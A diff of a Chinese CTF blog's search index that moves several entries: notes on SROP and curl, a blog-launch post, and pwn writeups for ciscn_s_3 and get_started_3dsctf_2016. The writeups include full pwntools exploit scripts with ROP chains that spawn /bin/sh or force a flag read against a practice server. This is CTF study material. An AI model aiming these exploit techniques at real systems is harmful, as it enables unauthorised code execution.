@@ -149,6 +149,31 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
       </tags>
   </entry>
   <entry>
+    <title>SROP</title>
+    <url>/2021/06/28/SROP/</url>
+    <content><![CDATA[<h1 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h1><p>Srop 的全称是Sigreturn Oriented Programming</p>
+<p>Srop 可以理解成一种高级的ROP，利用了linux下15号系统调用的-&gt;rt_sigreturn</p>
+<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal是Unix系统中的一种通信机制，通常用于在进程之间传递信息，也可以说是软中断信息</p>
+<p>常见于在一个进程中，内核向其发送发送软中断信号，该进程将暂时被挂起，系统进入内核态</p>
+<p>因为是暂时被挂起，所以系统会保留该进程的上下文  (部分内容摘自ctf-wiki)</p>
+<pre><code>将所有的寄存器压入栈中，以及signal信息和指向sigreturn的系统调用地址在栈顶上放置rt_sigreturn
+</code></pre>
+<p>此时栈上的内存分布：<br><img src="/img/14487175105930.png!small.jpg"></p>
+<p>这一段内存也被称为<strong>Signal Frame</strong></p>
+<h2 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h2><pre><code>Signal Frame 被放置在用户进程的内存空间中，也就说Signal Frame是可以读写的
+
+在恢复Signal信号的时候没有检测，也就是说我们可以通过改变Signal Frame中的信息来劫持控制流
+</code></pre>
+<p>例如：<br>  1  | rax = 59//对应59号系统调用-&gt; exceve<br>  2  | rdi = ‘/bin/sh’<br>  3  | rsi = 0<br>  4  | rdx = 0</p>
+<p>这样就能进行一个最简单的Srop</p>
+<h2 id="Srop链"><a href="#Srop链" class="headerlink" title="Srop链"></a>Srop链</h2><p>有时候我们希望执行一系列的操作,此时可以通过syscall ret;这个gadget去串联起我们我们的Srop链</p>
+<p>执行完一个SignalFrame接着执行下一个SignalFrame。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>unctf-fo</title>
     <url>/2022/01/21/UNCTF%E2%80%94%E2%80%94fo/</url>
     <content><![CDATA[<span id="more"></span>
@@ -194,31 +219,6 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
       <tags>
         <tag>pwn</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>SROP</title>
-    <url>/2021/06/28/SROP/</url>
-    <content><![CDATA[<h1 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h1><p>Srop 的全称是Sigreturn Oriented Programming</p>
-<p>Srop 可以理解成一种高级的ROP，利用了linux下15号系统调用的-&gt;rt_sigreturn</p>
-<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal是Unix系统中的一种通信机制，通常用于在进程之间传递信息，也可以说是软中断信息</p>
-<p>常见于在一个进程中，内核向其发送发送软中断信号，该进程将暂时被挂起，系统进入内核态</p>
-<p>因为是暂时被挂起，所以系统会保留该进程的上下文  (部分内容摘自ctf-wiki)</p>
-<pre><code>将所有的寄存器压入栈中，以及signal信息和指向sigreturn的系统调用地址在栈顶上放置rt_sigreturn
-</code></pre>
-<p>此时栈上的内存分布：<br><img src="/img/14487175105930.png!small.jpg"></p>
-<p>这一段内存也被称为<strong>Signal Frame</strong></p>
-<h2 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h2><pre><code>Signal Frame 被放置在用户进程的内存空间中，也就说Signal Frame是可以读写的
-
-在恢复Signal信号的时候没有检测，也就是说我们可以通过改变Signal Frame中的信息来劫持控制流
-</code></pre>
-<p>例如：<br>  1  | rax = 59//对应59号系统调用-&gt; exceve<br>  2  | rdi = ‘/bin/sh’<br>  3  | rsi = 0<br>  4  | rdx = 0</p>
-<p>这样就能进行一个最简单的Srop</p>
-<h2 id="Srop链"><a href="#Srop链" class="headerlink" title="Srop链"></a>Srop链</h2><p>有时候我们希望执行一系列的操作,此时可以通过syscall ret;这个gadget去串联起我们我们的Srop链</p>
-<p>执行完一个SignalFrame接着执行下一个SignalFrame。</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
   </entry>
   <entry>
     <title>UUCTF writeup</title>
@@ -593,19 +593,6 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
       </tags>
   </entry>
   <entry>
-    <title>blog诞生日2021.6.17</title>
-    <url>/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/</url>
-    <content><![CDATA[<span id="more"></span>
-<p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>
-]]></content>
-      <categories>
-        <category>日常闲话</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>canary</title>
     <url>/2021/12/20/canary/</url>
     <content><![CDATA[<span id="more"></span>
@@ -636,6 +623,19 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
       </categories>
       <tags>
         <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>blog诞生日2021.6.17</title>
+    <url>/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/</url>
+    <content><![CDATA[<span id="more"></span>
+<p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>
+]]></content>
+      <categories>
+        <category>日常闲话</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
       </tags>
   </entry>
   <entry>
@@ -713,6 +713,72 @@ main<span class="token punctuation">(</span><span class="token punctuation">)</s
       </tags>
   </entry>
   <entry>
+    <title>ciscn_s_3</title>
+    <url>/2021/06/28/ciscn-s-3/</url>
+    <content><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>检查保护机制，64位，开NX</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/image-20210628173000858.png" alt="image-20210628173000858"></h2><p>IDA打开，查看main函数，里面只有一个vuln函数</p>
+<p><img src="/img/image-20210628173110722.png" alt="image-20210628173110722"></p>
+<p>再查看vuln函数，一个sys_read,一个sys_write,写入0x400，读0x30，这里就发现栈溢出的漏洞</p>
+<p><img src="/img/image-20210628173134218.png" alt="image-20210628173134218"></p>
+<p>然后又发现了一个gadget函数</p>
+<p><img src="/img/image-20210628173525340.png" alt="image-20210628173525340"></p>
+<p><img src="/img/image-20210628174307696.png" alt="image-20210628174307696"></p>
+<h3 id="这里要注意："><a href="#这里要注意：" class="headerlink" title="这里要注意："></a>这里要注意：</h3><p>  mov      rax, 15       sys_rt_sigreturn</p>
+<p>  mov      rax, 59       sys_execve</p>
+<p>gadget函数没有被直接调用，该函数设置了rax=15并返回，推测可能和系统调用号有关。查到ubuntu18 64位系统调用号15为<strong>rt_sigreturn</strong>，用于恢复从用户态进入内核态所保存的上下文（即寄存器信息），59为<strong>execve</strong>，作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell、pathon脚本</p>
+<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p>
+<p><img src="/img/image-20210628175901200.png" alt="image-20210628175901200"></p>
+<p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p>
+<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28640</span><span class="token punctuation">)</span>
+<span class="token comment">#io=process('./ciscn_s_3')</span>
+main<span class="token operator">=</span><span class="token number">0x0004004ED</span>
+execve<span class="token operator">=</span><span class="token number">0x04004E2</span>
+pop_rdi<span class="token operator">=</span><span class="token number">0x4005a3</span>
+pop_rbx_rbp_r12_r13_r14_r15<span class="token operator">=</span><span class="token number">0x40059A</span>
+mov_rdxr13_call<span class="token operator">=</span><span class="token number">0x0400580</span> 
+sys<span class="token operator">=</span><span class="token number">0x00400517</span>
+
+payload1<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
+sh<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">280</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+payload2<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rbx_rbp_r12_r13_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
+payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span>mov_rdxr13_call<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span>
+payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>cat flag!</p>
+<p><img src="/img/image-20210628181623724.png"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CURL</title>
+    <url>/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span>
+
+<p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ciscn_2019_es_2</title>
     <url>/2021/06/28/ciscn-2019-es-2/</url>
     <content><![CDATA[<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>检查保护机制，32位，开启NX</p>
@@ -768,137 +834,6 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 
 <p>cat flag</p>
 <p><img src="/img/image-20210628221613459.png" alt="image-20210628221613459"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CURL</title>
-    <url>/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span>
-
-<p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ciscn_s_3</title>
-    <url>/2021/06/28/ciscn-s-3/</url>
-    <content><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>检查保护机制，64位，开NX</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/image-20210628173000858.png" alt="image-20210628173000858"></h2><p>IDA打开，查看main函数，里面只有一个vuln函数</p>
-<p><img src="/img/image-20210628173110722.png" alt="image-20210628173110722"></p>
-<p>再查看vuln函数，一个sys_read,一个sys_write,写入0x400，读0x30，这里就发现栈溢出的漏洞</p>
-<p><img src="/img/image-20210628173134218.png" alt="image-20210628173134218"></p>
-<p>然后又发现了一个gadget函数</p>
-<p><img src="/img/image-20210628173525340.png" alt="image-20210628173525340"></p>
-<p><img src="/img/image-20210628174307696.png" alt="image-20210628174307696"></p>
-<h3 id="这里要注意："><a href="#这里要注意：" class="headerlink" title="这里要注意："></a>这里要注意：</h3><p>  mov      rax, 15       sys_rt_sigreturn</p>
-<p>  mov      rax, 59       sys_execve</p>
-<p>gadget函数没有被直接调用，该函数设置了rax=15并返回，推测可能和系统调用号有关。查到ubuntu18 64位系统调用号15为<strong>rt_sigreturn</strong>，用于恢复从用户态进入内核态所保存的上下文（即寄存器信息），59为<strong>execve</strong>，作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell、pathon脚本</p>
-<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p>
-<p><img src="/img/image-20210628175901200.png" alt="image-20210628175901200"></p>
-<p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p>
-<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28640</span><span class="token punctuation">)</span>
-<span class="token comment">#io=process('./ciscn_s_3')</span>
-main<span class="token operator">=</span><span class="token number">0x0004004ED</span>
-execve<span class="token operator">=</span><span class="token number">0x04004E2</span>
-pop_rdi<span class="token operator">=</span><span class="token number">0x4005a3</span>
-pop_rbx_rbp_r12_r13_r14_r15<span class="token operator">=</span><span class="token number">0x40059A</span>
-mov_rdxr13_call<span class="token operator">=</span><span class="token number">0x0400580</span> 
-sys<span class="token operator">=</span><span class="token number">0x00400517</span>
-
-payload1<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
-sh<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">280</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-payload2<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rbx_rbp_r12_r13_r14_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span>mov_rdxr13_call<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
-
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>cat flag!</p>
-<p><img src="/img/image-20210628181623724.png"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>get_started_3dsctf_2016</title>
-    <url>/2021/06/17/get_started_3dsctf_2016/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>查看保护机制，32位，开了NX</p>
-<p><img src="/img/image-20210425011728468.png"></p>
-<p>IDA打开，main函数上的get_flag函数里发现一个flag.txt</p>
-<p><img src="/img/image-20210425011933854.png"></p>
-<p>继续跟进发现当满足一个条件时，可以打开flag.txt，即为a1 == 814536271 &amp;&amp; a2 == 425138641时</p>
-<p><img src="/img/image-20210425012146370.png"></p>
-<p>点击a1查看到了在栈中的位置</p>
-<p><img src="/img/image-20210425012353464.png"></p>
-<p>但是这两个位置在返回地址之后，无法利用溢出覆盖来实现控制</p>
-<p>只有继续看，tab+空格跳转之后发现了有关flag.txt的设置地址</p>
-<p><img src="/img/image-20210425012826978.png"></p>
-<p>从0x80489B8的位置开始才能打开flag.txt，于是想办法跳转到这儿</p>
-<p><img src="/img/image-20210425013007535.png"></p>
-<p>在main函数中发现可以利用gets函数溢出，覆盖返回地址，实现控制</p>
-<p><img src="/img/image-20210425013149728.png"></p>
-<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./get_started_3dsctf_2016'</span><span class="token punctuation">)</span>
-<span class="token comment">#r = remote("node3.buuoj.cn" , 26419)</span>
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
-payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x80489B8</span><span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>但是没办法得到flag，这里还发现这样远程是无法连接的</p>
-<p>看了网上的wp有大佬说需要维护栈，由于远端服务器中gets函数没有正常退出，它程序会崩溃，就无法获取到flag ，此时使用exit函数使gets函数强制退出，那么就能获得flag了，于是我又修改了exp，找到exit函数的位置,这时候也不需要再考虑a1、a2位置在返回地址后了，可以完全根据get_flag函数的要求来，传两个满足条件的数上去，然后顺理成章打开flag.txt得到flag</p>
-<p><img src="/img/image-20210425162841539.png"></p>
-<h3 id="exp2（强制退出）"><a href="#exp2（强制退出）" class="headerlink" title="exp2（强制退出）"></a>exp2（强制退出）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26419</span><span class="token punctuation">)</span>
-<span class="token comment">#r = process('./get_started_3dsctf_2016')</span>
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
-
-get_addr <span class="token operator">=</span> <span class="token number">0x080489A0</span>
-exit_addr <span class="token operator">=</span> <span class="token number">0x0804E6A0</span>
-
-a1 <span class="token operator">=</span> <span class="token number">814536271</span>
-a2 <span class="token operator">=</span> <span class="token number">425138641</span>
-
-payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>get_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>a2<span class="token punctuation">)</span>
-
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
-
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/img/image-20210425165227769.png"></p>
-<p>虽然这种方法应该不是最正确的做法，但我觉得这方法挺聪明，正规的做法需要通过mprotect函数修改bss段的权限，然后传入shellcode，但我能力有限，暂时还不会</p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -972,6 +907,71 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 
 <p>cat flag</p>
 <p><img src="/img/image-20210706133135129.png" alt="image-20210706133135129"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>get_started_3dsctf_2016</title>
+    <url>/2021/06/17/get_started_3dsctf_2016/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>查看保护机制，32位，开了NX</p>
+<p><img src="/img/image-20210425011728468.png"></p>
+<p>IDA打开，main函数上的get_flag函数里发现一个flag.txt</p>
+<p><img src="/img/image-20210425011933854.png"></p>
+<p>继续跟进发现当满足一个条件时，可以打开flag.txt，即为a1 == 814536271 &amp;&amp; a2 == 425138641时</p>
+<p><img src="/img/image-20210425012146370.png"></p>
+<p>点击a1查看到了在栈中的位置</p>
+<p><img src="/img/image-20210425012353464.png"></p>
+<p>但是这两个位置在返回地址之后，无法利用溢出覆盖来实现控制</p>
+<p>只有继续看，tab+空格跳转之后发现了有关flag.txt的设置地址</p>
+<p><img src="/img/image-20210425012826978.png"></p>
+<p>从0x80489B8的位置开始才能打开flag.txt，于是想办法跳转到这儿</p>
+<p><img src="/img/image-20210425013007535.png"></p>
+<p>在main函数中发现可以利用gets函数溢出，覆盖返回地址，实现控制</p>
+<p><img src="/img/image-20210425013149728.png"></p>
+<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./get_started_3dsctf_2016'</span><span class="token punctuation">)</span>
+<span class="token comment">#r = remote("node3.buuoj.cn" , 26419)</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x80489B8</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但是没办法得到flag，这里还发现这样远程是无法连接的</p>
+<p>看了网上的wp有大佬说需要维护栈，由于远端服务器中gets函数没有正常退出，它程序会崩溃，就无法获取到flag ，此时使用exit函数使gets函数强制退出，那么就能获得flag了，于是我又修改了exp，找到exit函数的位置,这时候也不需要再考虑a1、a2位置在返回地址后了，可以完全根据get_flag函数的要求来，传两个满足条件的数上去，然后顺理成章打开flag.txt得到flag</p>
+<p><img src="/img/image-20210425162841539.png"></p>
+<h3 id="exp2（强制退出）"><a href="#exp2（强制退出）" class="headerlink" title="exp2（强制退出）"></a>exp2（强制退出）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26419</span><span class="token punctuation">)</span>
+<span class="token comment">#r = process('./get_started_3dsctf_2016')</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+
+get_addr <span class="token operator">=</span> <span class="token number">0x080489A0</span>
+exit_addr <span class="token operator">=</span> <span class="token number">0x0804E6A0</span>
+
+a1 <span class="token operator">=</span> <span class="token number">814536271</span>
+a2 <span class="token operator">=</span> <span class="token number">425138641</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>get_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>a2<span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+
